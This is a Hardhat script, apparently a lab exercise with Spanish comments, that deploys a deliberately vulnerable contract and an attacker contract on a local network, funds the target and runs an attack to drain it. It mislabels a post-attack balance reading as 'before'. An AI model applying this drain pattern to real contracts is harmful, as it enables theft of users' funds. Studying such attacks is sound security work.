const { ethers } = require("hardhat");

async function main() {
    const [deployer, attacker] = await ethers.getSigners();
    console.log(`✅ Deployer: ${deployer.address}`);
    console.log(`✅ Attacker: ${attacker.address}`);

    // 🚀 Desplegar el contrato vulnerable
    const VulnerableContract = await ethers.getContractFactory("VulnerableContract");
    const vulnerable = await VulnerableContract.deploy();

    await vulnerable.waitForDeployment();
    console.log(`📌 Contrato vulnerable desplegado en: ${await vulnerable.getAddress()}`);

    // 💰 Depositar ETH en el contrato vulnerable
    let tx = await vulnerable.connect(deployer).deposit({ value: ethers.parseEther("10") });
    await tx.wait();
    console.log(`✅ Se depositaron 10 ETH en el contrato vulnerable`);

    // 🔥 Desplegar el contrato atacante
    const Attack = await ethers.getContractFactory("Attack");
    const attackContract = await Attack.connect(attacker).deploy(await vulnerable.getAddress());
    await attackContract.waitForDeployment();
    console.log(`📌 Contrato atacante desplegado en: ${await attackContract.getAddress()}`); // Arreglado error de `attack.getAddress()`

    // 💰 Verificar balance inicial del atacante
    let attackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log(`🔹 Balance inicial del atacante: ${ethers.formatEther(attackerBalance)} ETH`);

    // ⚔️ Ejecutar el ataque
    console.log("⏳ Iniciando ataque...");
    tx = await attackContract.attack({ value: ethers.parseEther("1"), gasLimit: 1000000 });
    await tx.wait();
    console.log("🚀 Ataque completado.");
    

    // 💰 Verificar balance del contrato vulnerable antes y después
    let balanceAntes = await ethers.provider.getBalance(await vulnerable.getAddress());
    console.log("💰 Balance del contrato vulnerable antes del ataque:", ethers.formatEther(balanceAntes));

    let balanceDespues = await ethers.provider.getBalance(await vulnerable.getAddress());
    console.log("💀 Balance del contrato vulnerable después del ataque:", ethers.formatEther(balanceDespues));

    // 🔥 Verificar balance final del atacante
    attackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log(`🔹 Balance final del atacante: ${ethers.formatEther(attackerBalance)} ETH`);

    tx = await attackContract.withdrawFunds();
    await tx.wait();
    console.log("✅ Fondos retirados del contrato atacante.");

}

//  🔍 Ejecutamos la función main
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
